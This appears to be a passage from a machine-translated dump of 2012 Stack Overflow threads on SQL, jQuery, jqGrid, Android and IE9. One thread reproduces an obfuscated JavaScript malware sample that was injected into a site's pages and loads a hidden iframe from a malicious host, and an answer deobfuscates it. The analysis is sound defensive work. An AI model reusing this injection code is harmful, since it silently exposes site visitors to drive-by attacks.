PRODFUND.PDFDCODE = PROFDESC.PROFREF 
AND PRODFUND.PDFDTYPE = 2; 
```

我相信我的第一个实际上是加入 A 到 B 和 B 到 C，因为我希望连接包括 A 到 C

有什么建议么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-26T14:30:55.700

您只需要在先前定义的查询中定义表。这应该可以正常工作。

```
SELECT DISTINCT PROFDESC.* 
FROM PROFDESC 
INNER JOIN PRODFUND ON PRODFUND.PDFDCODE = PROFDESC.PROFREF     
INNER JOIN PRODUCT ON PRODFUND.PRODCD = PRODUCT.PRODCD 
WHERE PRODFUND.PDFDTYPE = 2 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T14:34:59.817

加入时应使用正确的顺序

```
SELECT DISTINCT PROFDESC.*
FROM
    PROFDESC
    INNER JOIN PRODFUND
        ON PROFDESC.PROFREF = PRODFUND.PDFDCODE
    INNER JOIN PRODUCT
        ON PRODFUND.PRODCD = PRODUCT.PRODCD  
WHERE
    PRODFUND.PDFDTYPE = 2 
```

但是你为什么要加入 PRODUCT？你不是指它的任何列。加入是否会以某种方式缩小结果？如果没有，请放弃：

```
SELECT DISTINCT PROFDESC.*
FROM
    PROFDESC
    INNER JOIN PRODFUND
        ON PROFDESC.PROFREF = PRODFUND.PDFDCODE
WHERE
    PRODFUND.PDFDTYPE = 2 
```

也许 DISTINCT 可以被删除（取决于连接的基数）。

# javascript - jquery 上的链接行为问题，e.preventDefault 不起作用？

> ID：12603929
> 
> 赞同：1
> 
> 时间：2012-09-26T14:25:32.537
> 
> 标签：javascript, jquery

我正在学习 Jquery，并且对一段代码有一些小问题......这里是：

```
$('.product-box .thumb a').click(function(event) {
    event.preventDefault();
    src = $(this).find('img').attr('src')
    $('.products .product-box .image img.principal').fadeOut('fast', function() {
        $('.products .product-box .image img.principal').attr('src', src);
        $('.products .product-box .image img.principal').fadeIn('fast');
    });
    $('.products .product-box .zoom a.principal').attr('href', src);
}); 
```

这是HTML：

```
 <div class="product-box">
    <div class="image">
      <img src="<?php echo $FOTO; ?>" class="principal" alt="<?php echo $NOME; ?>">
      <div class="zoom"><a class="fancybox lupa principal"  rel="group" href="<?php echo $FOTO; ?>">ampliar</a></div>

      <div class="thumb">
        <a href="#"><img src="http://fernandonagao.com.br/img/logo.png" alt="<?php echo $NOME; ?>"></a>
        <a href="#"><img src="<?php echo $FOTO; ?>" alt="<?php echo $NOME; ?>"></a>
        <a href="#"><img src="<?php echo $FOTO; ?>" alt="<?php echo $NOME; ?>"></a>
      </div>

    </div>
    <div class="desc-prod">
      <h1><?php echo $NOME; ?></h1>
      <p>
        <?php echo $DESC_PRODUTO; ?>
      </p>
      <span><!-- R$ --> <?php echo $VALOR; ?></span>
      <!--<span>Cores Disponíveis:</span>
      <div class="color" style="background-color:#dc5f1b"></div><div class="color" style="background-color:#89ca06"></div><div class="color" style="background-color:#d3bb8c"></div><div class="color" style="background-color:#ce925a"></div>-->
      <span class="voltar"><a href="produtos.php?categoria=<?php echo $categoria; ?>">< Voltar às Categorias</a></span>
    </div><!-- desc-prod -->
  </div><!-- product-box --> 
```

所以，我想淡化产品上的图像，把它`src`放在正确的位置，你可以[在这里](http://viotidesign.com.br/clientes/casafelice/prod-open.php?categoria=9&produto=8)看到一切都很好，除了页面行为链接行为，并将窗口聚焦在顶部，我没有知道为什么。首先，我尝试了没有链接的相同代码，只有图像，同样的事情发生了。一些想法？

谢谢！！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:34:37.073

导航*被*阻止，但您淡出图像，最终将其从页面中*隐藏。*当图像的区域被视觉移除时，页面会自动滚动到顶部，因为页面变得不那么高了。之后，您会淡入新图像，但必要的滚动已经发生。

您想要的是将图像包装在`<div>`具有固定大小的容器（例如 a ）中，以便容器保持其大小。这样，不会发生滚动，因为即使里面的图像被隐藏，容器也会不断占用空间。不过，看起来您已经对图像应用了填充。您最好也将其移动到容器中，以便填充在过渡期间也保持不变。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T14:31:35.080

爱德华多，

尝试更改您的代码

```
$('.product-box .thumb a').click(function(event) { 
```

至

```
$('.product-box').delegate('.thumb a', 'click', function(event) { 
```

在jQuery中很重要当代码执行时，一般规则，您需要等待文档加载

```
$(function(){
  // put your code here
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-26T14:32:08.073

e.preventDefault 单独是不够的，你应该在最后返回 false

# json - JQGrid 不会在 MVC4 CSHTML 视图中显示

> ID：12603930
> 
> 赞同：2
> 
> 时间：2012-09-26T14:25:34.363
> 
> 标签：json, jqgrid, linq-to-entities, asp.net-mvc-4, jqgrid-asp.net

我很难让 jqgrid 在我的 MVC 4 Web 应用程序视图中显示。我已经在标准 html 文档中测试了完全相同的视图代码并显示了网格，但是只有 h2 标记显示在我的索引视图中。我什至设法让模型信息显示在 html 文档中，所以我真的很困惑为什么网格甚至不会加载到我的 MVC 视图中。

我的网格数据的控制器代码如下：

```
 public ActionResult GridData()
    {
        var query = (from u in db.Users

                     join ur in db.User_Relationship on u.User_ID equals ur.Child_ID

                     join lu in db.Lookups on u.First_LanguageID equals lu.LookupID

                     join ut in db.User_Tests on u.User_ID equals ut.User_ID into ps
                     from ut in ps.DefaultIfEmpty()

                     where ur.Parent_ID == 45875

                     group new { u, lu } by new
                     {
                         u.User_ID, u.Forename, u.Surname, u.Client_Code,
                         u.User_Name, u.Password, u.Email, u.Gender,
                         u.Report_date, u.EmailDate, u.Job_Function,
                         lu.LookupValue
                     } into g

                     select new UserViewModel
                     {
                         User_ID = g.Key.User_ID,
                         Forename = g.Key.Forename,
                         Surname = g.Key.Surname,
                         Client_Code = g.Key.Client_Code,
                         User_Name = g.Key.User_Name,
                         Password = g.Key.Password,
                         Email = g.Key.Email,
                         Gender = g.Key.Gender,
                         Report_Date = g.Key.Report_date,
                         Email_Date = g.Key.EmailDate,
                         Job_Function = g.Key.Job_Function,
                         Lookup_Value = g.Key.LookupValue
                     });

        var jsonData = new 
        {
            total = 10,  
            page = 1,
            records = 50, 

            rows = query.Select(x => new 
            {
                x.User_ID, x.Forename, x.Surname, x.Client_Code, x.User_Name,
                x.Password, x.Email, x.Gender, x.Report_Date, x.Email_Date,
                x.Job_Function, x.Lookup_Value
            }).ToList().Select(x => new
            {
                id = x.User_ID,
                cell = new string[]
                {
                    x.User_ID.ToString(),
                    x.Forename,
                    x.Surname,
                    x.Client_Code.ToString(),
                    x.User_Name,
                    x.Password,
                    x.Email,
                    x.Gender,
                    x.Report_Date.ToString(),
                    x.Email_Date.ToString(),
                    x.Job_Function,
                    x.Lookup_Value
                }}).ToArray(),             
        };
        return Json(jsonData, JsonRequestBehavior.AllowGet);
    } 
```

Index的方法如下：

```
 public ActionResult Index()
    {
        return View();
    } 
```

我对 Index.cshtml 的视图代码如下：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>My First Grid</title>

<link rel="stylesheet" type="text/css" media="screen" href="css/ui-lightness/jquery-ui-1.8.23.custom.css" />
<link rel="stylesheet" type="text/css" media="screen" href="css/ui.jqgrid.css" />

<script src="js/jquery-1.7.2.min.js" type="text/javascript"></script>
<script src="js/i18n/grid.locale-en.js" type="text/javascript"></script>
<script src="js/jquery.jqGrid.min.js" type="text/javascript"></script>

<script type="text/javascript">
    jQuery(document).ready(function ()
    {
        jQuery("#list").jqGrid(
            {
                url: '/WebFormUserList/GridData',
            datatype: 'json',
            mtype: 'GET',
            colNames:
                [
                    'User_ID', 'Forename', 'Surname', 'Client_Code', 'User_Name',
                    'Password', 'Email', 'Gender', 'Report_Date', 'Email_Date',
                    'Job_Function', 'Lookup_Value'
                ],
            colModel:
                [
                    { name: 'User_ID', index: 'User_ID', width: '50', align: 'centre' },
                    { name: 'Forename', index: 'Forename', width: '50', align: 'centre' },
                    { name: 'Surname', index: 'Surname', width: '50', align: 'centre' },
                    { name: 'Client_Code', index: 'Client_Code', width: '50', align: 'centre' },
                    { name: 'User_Name', index: 'User_Name', width: '50', align: 'centre' },
                    { name: 'Password', index: 'Password', width: '50', align: 'centre' },
                    { name: 'Email', index: 'Email', width: '50', align: 'centre' },
                    { name: 'Gender', index: 'Gender', width: '50', align: 'centre' },
                    { name: 'Report_Date', index: 'Report_Date', width: '50', align: 'centre' },
                    { name: 'Email_Date', index: 'Email_Date', width: '50', align: 'centre' },
                    //{ name: 'Test_Count', index: 'Test_Count', width: '50', align: 'centre' },
                    //{ name: 'Test_Completed', index: 'Test_Completed', width: '50', align: 'centre' },
                    { name: 'Job_Function', index: 'Job_Function', width: '50', align: 'centre' },
                    { name: 'Lookup_Value', index: 'Lookup_Value', width: '50', align: 'centre' },
                ],

            pager: jQuery('#pager'),
            height: 'auto',
            width: '1000',
            rowNum: 10,
            jsonReader: { repeatitems: false },
            rowList: [5, 10, 20, 50],
            sortname: 'Id',
            sortorder: "desc",
            viewrecords: true,
            imgpath: '/css/ui-lightness/images',
            caption: 'My first grid'
        });
});
</script>

</head>
<body>
<h2>My Grid Data</h2>
<table id="list" class="scroll" cellpadding="0" cellspacing="0"></table>
<div id="pager" class="scroll" style="text-align:center;"></div>
</body>
</html> 
```

任何帮助将不胜感激，因为我不确定出了什么问题。我相当确定返回的 json 格式正确，因为 html 文档很乐意接受它。

我唯一的想法是，因为网格甚至不会加载，所以发生了一些事情来中断它在 MVC4 的 _layout.html 中的创建。

再次，提前感谢。

# javascript - 为什么任意放置在字符串中的空终止符不会终止它？

> ID：12603931
> 
> 赞同：8
> 
> 时间：2012-09-26T14:25:34.077
> 
> 标签：javascript, string, terminator

空字符或空终止符 ( `\0`) 用于终止连续的字符序列。我发现在 C 中，我可以将字符添加到随机位置的字符串中，并且字符串将从该点被切断。例如：

```
char * s = "Hello\0World"; 
```

将导致`s`等于字符串`"Hello"`。然而，在 JavaScript 中，情况并非如此：

```
var s = "Hello\0World"; 
```

以上将无法按预期工作。`s`将等于字符串`"HelloWorld"`。

为什么这不起作用？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-09-26T14:28:48.387

JavaScript 不使用以 NULL 结尾的字符串，而 C 则使用。

Javascript 字符串是通过单独跟踪字符和长度来存储的，而不是试图假设 NULL 标记字符串的结尾。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-26T14:35:32.003

C 字符串仍然指向内存中存储“Hello\0World”的地址，只是大多数字符串处理函数认为字符串的结尾为 0。对于某些函数，您必须传递一个字符串长度参数，但最简单的是读取直到找到空字节。在内存中，字符串实际上是“Hello\0World\0”。

JavaScript 引擎无法通过查找空字节来确定字符串长度，因为在这种情况下，您将永远无法在字符串中包含空字节。规格中可能有一些关于此的内容。引擎必须单独存储字符串的长度，然后在您访问字符串时从内存中读取那么多字符。

而如何正确解析和存储缓冲区的大小是脚本语言通常试图对用户隐藏的东西。这是脚本的一半目的，不需要程序员担心添加`0`到创建的字符缓冲区和/或单独存储字符串长度，以便字符串处理函数不会在缓冲区之外打印一堆随机字符以寻找空字节......

那么 JavaScript 字符串究竟是如何表现的呢？我不知道，可能要靠引擎来深入描述它的属性。只要您像规范所说的那样与对象交互，它就可以以任何方式实现，使用缓冲区和长度的结构，使用 0 的翻译字符，使用字符的链接列表等......

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-26T14:33:34.463

在 Javascript`NULL`中，String 中的`NULL`字节只是字符串中的字节。如果你想截断字符串

```
var s = "Hello\0World".split("\0").shift(); 
```

但在这种情况下，我认为它不需要打扰空字节:)

# ember.js - 如何将 Ember-Bootstrap 添加到通过 Yeoman 创建的 EmberJS 项目中

> ID：12603932
> 
> 赞同：1
> 
> 时间：2012-09-26T14:25:36.217
> 
> 标签：ember.js, yeoman

我已经开始研究 EmberJS 应用程序并使用 Yeoman 生成骨架结构。现在，我想将 Ember-Bootstrap 添加到我的项目中，但在这样做时遇到了麻烦。我从 GitHub 下载了最新版本并解压缩，但我不确定要包含什么。

我在 packages/ember-bootstrap/lib 文件夹中看到了几个 .js 文件。我需要包括所有这些吗？如果是这样，那么我应该按什么顺序包含它们？

有人在另一个答案中提到您需要将其添加到“资产”文件夹中，但我没有其中一个。

安装 Ember-Bootstrap 需要 Rails 项目吗？我不熟悉 Rails，所以请原谅新手的问题。

谢谢。

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2013-09-10T18:33:02.620

我发现了一个很棒的项目，它支持带有许多组件的 Bootstrap 3.0，

你可以在这里找到它： [https ://github.com/ember-addons/bootstrap-for-ember](https://github.com/ember-addons/bootstrap-for-ember)

你可以看到所有活着的组件：

[http://ember-addons.github.io/bootstrap-for-ember](http://ember-addons.github.io/bootstrap-for-ember)

祝你好运。

# android - 无需点击地图中的标记即可自动显示叠加层

> ID：12603934
> 
> 赞同：1
> 
> 时间：2012-09-26T14:25:44.360
> 
> 标签：android, google-maps, overlay

我可以通过单击地图上的标记来显示自定义叠加层。但是如何在不单击标记的情况下显示此叠加层？！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T14:38:28.507

以下链接为您提供了一种无需点击地图中的标记即可自动显示叠加的解决方案

[在Android地图上更改位置时如何删除标记并重新绘制它](https://stackoverflow.com/questions/10258192/how-to-remove-marker-and-redraw-it-again-when-changing-location-on-android-map)

# android-widget - 通过 Android 的 xml 文件填充数据

> ID：12603935
> 
> 赞同：0
> 
> 时间：2012-09-26T14:25:50.743
> 
> 标签：android-widget

我是安卓新手。我创建了一个导航栏。单击导航栏中的其中一个按钮后，应显示一个浮动表，并且必须通过 xml 文件加载数据。我应该使用列表视图还是表格布局来显示数据？我还需要代码方面的帮助。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T14:29:45.577

数据来自 XML 的事实是无关紧要的。

您可能想要一个表格布局。

你的问题太宽泛了，任何人都无法准确回答。

# javascript - Javascript 恶意软件注入，我是如何获得它以及如何解密它的？

> ID：12603937
> 
> 赞同：0
> 
> 时间：2012-09-26T14:25:52.383
> 
> 标签：javascript, code-injection, phpbb3, malware

出于某种原因，我还没有发现我服务器上的所有 .html 和 .php 文件都已更改为包含以下 Javascript（我已使用[http://jsbeautifier.org/](http://jsbeautifier.org/)对其进行了美化）：

```
<script type="text/javascript">
if ('GulVG' == 'dvLWnC') LCXW = 'ukNoT';
if ('QjTy' == 'OGvoYK') iBPba = 'YmwGf';
var qiyTHJNSK = "939f9f9b655a5a968c9f909e9f8c9f626259a09e5a9499598e92946a64";

function NEHbsc() {
    var RQrwz = 'ufOn';
    if ('Juxm' == 'mHxLm') Niaf();
}
var px1_var = "1px";
var uvWXHd = 'pDito';
if ('skhYX' == 'Gczk') hYkhb();
var rGsu;
var hitxMCSTc = "pa\x72s\x65\x49nt";
var WNOgK = "b\x6fdy";
var oqHu;
var NPOXa = 39;
var HGBXMBYkq = "co\x6e\x73tructor";
var CodwDw;
var adBe = 261;
var fmvCwPvf = "\x66\x72o\x6dC\x68ar\x43ode";
var gmCUwm = 6;
var BcWka = 'prssL';
var SjIk = 'DcwGHM';
var UBzc;
var pubYymvCW = "a\x70\x70en\x64C\x68ild";
var EVHJIA = 'nGzZ';
if ('NWGB' == 'XlySU') AWtq();
var LnJbDi = "";
if ('jUcBg' == 'tFKsdn') fRhEH = 'PEeA';
var LgLiBeb = "\x73li\x63e";
if ('cXqZe' == 'hdvrt') KIkyJ();
var appVersion_var = "\x61ppV\x65r\x73i\x6fn";
var DaGd = 'WJdpuS';
var UNLOOk = 118;
var px0_var = "0\x70x";
var yufL = 268;
if ('vlwmVU' == 'dtNS') dFobAh = 'dbES';
var coiJVUL = (function () {
    function HMtGY() {}
    var JWuN = 'Dztvmh';
    var JZEGM;
    return this;

    function FeZd() {
        var IZZFyk = 'LOij';
        if ('SomCO' == 'VtLBbq') uThvZ();
    }
})();

function utrcTc() {
    var sQqTc = 'GDjGUL';
    if ('GGbJ' == 'CdUOt') PFLkIv();
}
var yILQN;
var BlpVKOn = "GJfIbBp" [HGBXMBYkq];
var Cspfjl = 'cRBOTm';
var AhJvb;
for (var naxoJ = 0; naxoJ < qiyTHJNSK.length; naxoJ += 2) {
    function mthsyA() {}
    coesFKAJH = coiJVUL[hitxMCSTc](qiyTHJNSK[LgLiBeb](naxoJ, naxoJ + 2), 16) - 43;
    var ihta;
    LnJbDi += BlpVKOn[fmvCwPvf](coesFKAJH);
    if ('YwvB' == 'nLaBq') FxCUcY = 'LClI';

    function LuHhQ() {}
    if ('rLTy' == 'RGZAH') InLSa = 'hqGi';
}
var pRLWk = 'qYTdKF';
var dbQz = 'IuaOpO';
var NLauPPxo = "KXDDhcUB";

function WiKx() {
    var RqlT = 'TnwXV';
    if ('mGATZ' == 'BoFZqb') IaMIR();
}
var KVmoXu = 'CCmbz';
var fpSlvS;

function kIyvYK() {
    var kejS = 'hRGKfF';
    if ('dwlh' == 'PerQmS') NeWE();
}
var HukG = 171;
var SCQFe = "";
var ZSeQP;
if ('TYhSD' == 'pOHCUl') xDKJc();
var QgUskg = 165;
if (navigator[appVersion_var].indexOf("MSIE") != -1) {
    var XGZk = 162;
    var dQaQT;
    SCQFe = '<iframe name="' + NLauPPxo + '" src="' + LnJbDi + '">';

    function cxMsRj() {
        var gRqlMJ = 'YxSQd';
        if ('Yedbfb' == 'FmRTE') zMRsf();
    }
    if ('UFqh' == 'inxzUL') IMhGyA();
    var LnEoLC;
} else {
    function NBxX() {
        var rUxrb = 'oyDIE';
        if ('trsJw' == 'EffuZz') zIRGF();
    }
    var pZBDH = 'FbTqY';
    SCQFe = 'iframe';
    if ('qJQEx' == 'sEOu') Jjcc();
    var LtKfoR;
}
var RHgYbw = 209;
var XGCxE = document.createElement(SCQFe);
var osIEg = 'zpisyX';
var yTDi;
XGCxE.REKhC = function () {
    var EhIV;
    this["src"] = LnJbDi;
    var hITyC = 47;

    function QPAbon() {
        var vlUKyt = 'ydOwpE';
        if ('bUzfeI' == 'Gtzuz') xqXIgA();
    }
}

function uNdxy() {}
if ('tXIjw' == 'ZuZUXu') TJmV = 'OZLhL';
XGCxE.style.right = px0_var;
var INwC = 218;

function eXRqv() {}
XGCxE.style.position = "absolute";
var myUH = 129;
var itYaqs = 'PIEQTG';
XGCxE.style.height = px1_var;

function Cncutd() {
    var rElSS = 'aVJgKV';
    if ('OlroM' == 'QRUVc') ZSoo();
}
if ('RpUI' == 'UbjbH') DfFH = 'LQKPT';

function jpdw() {}
XGCxE.name = NLauPPxo;

function GZKiB() {
    var HGDCTk = 'uDGc';
    if ('FdUgR' == 'hVIV') dcxx();
}
function vaVVBx() {
    var PFhZz = 'CWQbMT';
    if ('gEEvG' == 'aPzLMo') dMSclV();
}
XGCxE.REKhC();

function eInNvF() {}

function gPMoah() {
    var UrmQn = 'fnwS';
    if ('RJhZkZ' == 'NoYtxc') lkhw();
}
var xFoDke = 185;
XGCxE.style.top = px0_var;

function LXpA() {}

function Qkls() {
    var rwmtT = 'RLulmG';
    if ('mvum' == 'mQYG') RSKN();
}
XGCxE.style.width = px1_var;
var OMySFE = 'AJgrgE';

function yvFj() {}

function YzJdttK() {
    function nWCtr() {
        var HbXEi = 'cssMz';
        if ('gwMUm' == 'fJUX') Jblip();
    }
    var kNePZX;
    if (document[WNOgK]) {
        if ('Mwub' == 'FLNDO') TdNEy = 'WAnb';
        var AfhI = 'gdwUZG';
        var UdZQcB;
        var document_body_var = document[WNOgK];
        if ('mjKa' == 'hCEFj') Vmkvz();
        if ('knkq' == 'QLKklH') ygHF();
        document_body_var[pubYymvCW].apply(document_body_var, [XGCxE]);

        function jbGXOJ() {
            var ovQXvi = 'HTXX';
            if ('fllkOR' == 'OQlK') xGgRO();
        }
    } else {
        var jJJY = 67;
        setTimeout(YzJdttK, 120);
        var fvmrr = 'HIfEiu';

        function KvOj() {
            var gLdJK = 'XueY';
            if ('ppiCfu' == 'xudev') ZqGbGK();
        }
    }
    var qUvxeh;
}
var EKFO = 10;
var rbiRyL;
YzJdttK();

function uJgk() {
    var QbDju = 'lEEFak';
    if ('jBDVr' == 'OzMogy') EHbmqV();
}
var Jslsu = 'BXWm';
</script> 
```

有人可以帮我破译吗？另外我怎么知道我是怎么得到这个的，有没有办法追溯它？

干杯!

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:38:54.277

从所有 var 声明和错误条件 if 语句中清除，实际执行的是：

```
var qiyTHJNSK = "939f9f9b655a5a968c9f909e9f8c9f626259a09e5a9499598e92946a64";

var HGBXMBYkq = "co\x6e\x73tructor"; // constructor
var fmvCwPvf = "\x66\x72o\x6dC\x68ar\x43ode"; // fromCharCode
var BlpVKOn = "GJfIbBp" [HGBXMBYkq]; // String()
var hitxMCSTc = "pa\x72s\x65\x49nt"; // parseInt
var WNOgK = "b\x6fdy"; // body
var LgLiBeb = "\x73li\x63e"; // slice
var LnJbDi = "";

var coiJVUL = (function () {
    return this;
})();

for (var naxoJ = 0; naxoJ < qiyTHJNSK.length; naxoJ += 2) {
    coesFKAJH = coiJVUL[hitxMCSTc](qiyTHJNSK[LgLiBeb](naxoJ, naxoJ + 2), 16) - 43;
    LnJbDi += BlpVKOn[fmvCwPvf](coesFKAJH);
}

if (navigator[appVersion_var].indexOf("MSIE") != -1) {
    SCQFe = '<iframe name="' + NLauPPxo + '" src="' + LnJbDi + '">';
} else {
    SCQFe = 'iframe';
}
var XGCxE = document.createElement(SCQFe);

XGCxE.REKhC = function () {
    this["src"] = LnJbDi;
};

XGCxE.style.right = px0_var;

XGCxE.style.position = "absolute";

XGCxE.style.height = px1_var;

XGCxE.name = NLauPPxo;

XGCxE.REKhC();

XGCxE.style.top = px0_var;

XGCxE.style.width = px1_var;

function YzJdttK() {

    if (document[WNOgK]) {

        var document_body_var = document[WNOgK];

        document_body_var[pubYymvCW].apply(document_body_var, [XGCxE]);

    } else {

        setTimeout(YzJdttK, 120);
    }
}

YzJdttK(); 
```

因此，它完成了所有这些脚本所做的事情：它附加了一个不可见的 iframe，在您的情况下，它带有位置`http[evil]://katestat77.us/in.cgi?9`

# android - 是否可以生成少于 1 秒长的音调/音频？还是立即切断播放器？

> ID：12603942
> 
> 赞同：1
> 
> 时间：2012-09-26T14:25:58.293
> 
> 标签：android, audio, audiotrack

我正在尝试创建一个应用程序，该应用程序根据您在屏幕上触摸的位置生成音调（当前频率由触摸点的 y 值确定）但是我无法生成小于一秒的音调不会让我的应用崩溃！我从[这里的答案](https://stackoverflow.com/questions/2413426/playing-an-arbitrary-tone-with-android)中获取代码并调整它以在我触摸屏幕时播放，但是当我将持续时间变量更改为小于 1 的值时，应用程序崩溃了！是否可以产生小于 1 秒的音调？

我想创建不到一秒的音调的唯一原因是，当我暂停或停止音轨时，音频播放器似乎没有立即切断。这些是我演奏和产生音调的方法：

```
RelativeLayout background;
SoundPool soundPool;
TextView textView;

private final float duration = 1f; // seconds
private final int sampleRate = 8000;//was 8000
private final int numSamples = (int) duration * sampleRate;
private final double sample[] = new double[numSamples];
private final double freqOfTone = 250; // hz

AudioTrack audioTrack ;

int dispWidth = 0, dispHeight = 0;

Handler handler = new Handler();

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_audio);
    background = (RelativeLayout) findViewById(R.id.background);
    textView = (TextView) findViewById(R.id.textView2);
    soundPool = new SoundPool(1, AudioManager.STREAM_MUSIC, 0);
    dispWidth = AppHelper.getDisplayWidth(getApplicationContext());
    dispHeight = AppHelper.getDisplayHeight(getApplicationContext());
    audioTrack = new AudioTrack(AudioManager.STREAM_MUSIC,
            sampleRate, AudioFormat.CHANNEL_OUT_MONO,
            AudioFormat.ENCODING_PCM_16BIT, numSamples,
            AudioTrack.MODE_STREAM);
    final byte genTone[]= genTone(freqOfTone);

    background.setClickable(true);

         background.setOnTouchListener(new OnTouchListener() {

          @Override
         public boolean onTouch(View v, MotionEvent event) {
        if(event.getAction()==MotionEvent.ACTION_UP)
            {
                Log.d(LOG_TAG, "Touch up! Stopping tone...");
                audioTrack.pause();
                audioTrack.flush();

            }
            else
            {
                //these apparently cause immediate stop
                audioTrack.pause();
                audioTrack.flush();

                int R = (int) (event.getY()%255);
                int G =  (int)(event.getX()%255);
                int B = (int) ((event.getY()+event.getX())%255);
                Log.i(LOG_TAG, "Changine colour to "+R+","+G+","+B);
                background.setBackgroundColor(Color.rgb(R, G, B));
                int colorFromPressure = (int) (event.getPressure()*255);
                textView.setTextColor(Color.rgb(colorFromPressure,colorFromPressure,colorFromPressure));
                playSoundAtFrequency(250+event.getY(), event.getX()/dispWidth);
            }
            return false;
    }
     });
}

byte[] genTone(double toneFrequency){
    final byte generatedSnd[] = new byte[2 * numSamples];
    // fill out the array
    for (int i = 0; i < numSamples; ++i) {
        sample[i] = Math.sin(2 * Math.PI * i / (sampleRate/toneFrequency));
    }

    // convert to 16 bit pcm sound array
    // assumes the sample buffer is normalised.
    int idx = 0;
    for (double dVal : sample) {
        short val = (short) (dVal * 32767);
        generatedSnd[idx++] = (byte) (val & 0x00ff);
        generatedSnd[idx++] = (byte) ((val & 0xff00) >>> 8);
    }
    return generatedSnd;
}

void playSound(final byte[] generatedSnd, float volume){        

    //these apparently cause immediate stop
    audioTrack.pause();
    audioTrack.flush();

    audioTrack.write(generatedSnd, 0, numSamples);
    audioTrack.setStereoVolume(volume, volume);

    audioTrack.play();
    Log.d(LOG_TAG, "Playing tone...");
}

public void playSoundAtFrequency(final double toneFrequency,float volume)
{

    final byte genTone[]= genTone(toneFrequency);
    playSound(genTone, volume);

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T04:04:55.700

我认为您的崩溃是由于使用的缓冲区大小对于您尝试创建的 AudioTrack 来说太小了。

```
int audioBufferSize = AudioTract.getMinBufferSize(sampleRate,
                                                  AudioFormat.CHANNEL_OUT_MONO,
                                                  AudioFormat.ENCODING_PCM-16BIT);
audioTrack = new AudioTrack(AudioManager.STREAM_MUSIC,
        sampleRate, AudioFormat.CHANNEL_OUT_MONO,
        AudioFormat.ENCODING_PCM_16BIT, audioBufferSize,
        AudioTrack.MODE_STREAM); 
```

然后 numSamples 仍然适用于您的生成缓冲区，并且 AudioTrack 将具有所需的缓冲区大小。

# android - 触摸移动和调整布局

> ID：12603949
> 
> 赞同：2
> 
> 时间：2012-09-26T14:26:25.240
> 
> 标签：android, android-layout, android-widget

我在 Galaxy Tab 电子邮件应用程序或我的文件应用程序（在 Galaxy 选项卡上运行）中看到。用户可以触摸垂直线并移动，列表视图大小会随着用户触摸移动而变化。喜欢这个视频： [Galaxy_tab_email_app](http://www.youtube.com/watch?v=_xfRKau3uDI&list=HL1348664439&feature=mh_lolz)

我看到当用户触摸列表视图的边缘时。出现一条垂直线。像这张图片： ![在此处输入图像描述](../Images/6513effc28845dc6bcbcc643130a058c.png)

我的问题是：

1.  应用程序如何在图像上出现带有特殊红色部分的线条？
2.  应用程序如何调整列表视图的大小？

正如我的猜测。“线视图”捕捉触摸动作，当用户移动手指时，应用程序会调整列表视图（或列表视图的父布局）的大小。但我不知道我们是否有其他方法？

谢谢你，很抱歉，因为我的英语不是很好。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T16:30:46.933

一个猜测，因为我不知道这个应用程序是如何做到的：

一个。创建一个自定义视图类并具有描述 x、y、宽度、高度等的属性以及用于绘制指针的 y 位置的属性（“红色特殊位”）。

x,y, width, height 只是描述条的位置。指针位置由列表视图控制，具体取决于您选择的项目。覆盖视图的 onDraw() 方法以绘制条形图。在画布上绘制这样的形状并不难。

[http://www.stanford.edu/class/cs193a/06/](http://www.stanford.edu/class/cs193a/06/)

湾。覆盖类的 onTouch() 方法并捕获栏上的拖动操作。使用接口注册回调到想要知道何时拖动栏的类，例如左侧的列表视图和右侧的布局。

在此处研究自定义复选框示例：

[http://iserveandroid.blogspot.co.uk/](http://iserveandroid.blogspot.co.uk/)

# html - ie9滚动条和蚀刻边框总是显示在对象上

> ID：12603954
> 
> 赞同：1
> 
> 时间：2012-09-26T14:26:36.077
> 
> 标签：html, css, internet-explorer-9, scrollbar, border

我有一些简单的 html 和 css（见下文），它们在 Div 标记中显示了一个 flex 应用程序。在大多数浏览器（ie8、chrome、FF）中，对象没有边框或垂直滚动​​条。在 ie9 中，同时显示了滚动条和 3D 蚀刻边框。我想删除那些，我尝试了各种边框样式，但似乎没有任何帮助。有人对此有解决方案吗？这是仅 ie9 的已知问题吗？

我对 Html、CSS、javascript 等有点陌生，我不得不说，IE 浏览器很痛苦！

```
 #mapLocation
  {
    position: absolute;
    top: 131px;
    left:0;
    z-index: 0;
    bottom: 120px;
    width: 100%;
    z-index: 2;
    border-style: none;
  }

  #mapObject{
    position:relative;
    width: 100%;
    height: 100%;
    z-index: 2;
    border-style: none; 
  }
</style>

<div id="mapLocation" >
    <object id="mapObject" type="text/html" data="otherFile.html"></object>
</div> 
```

谢谢你的帮助，

吉尔曼

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T15:22:39.720

我只是有同样的[问题](https://stackoverflow.com/questions/12604589/php-versions-ie9-css-clashes-of-the-select-element#comment16990153_12604589)。它可能是在您的 IE9 浏览器中打开的兼容模式。尝试取消选中它。

# php - 使用 我试过用谷歌搜索，但找不到设置。

> ID：12603958
> 
> 赞同：7
> 
> 时间：2012-09-26T14:26:50.180
> 
> 标签：php, wamp

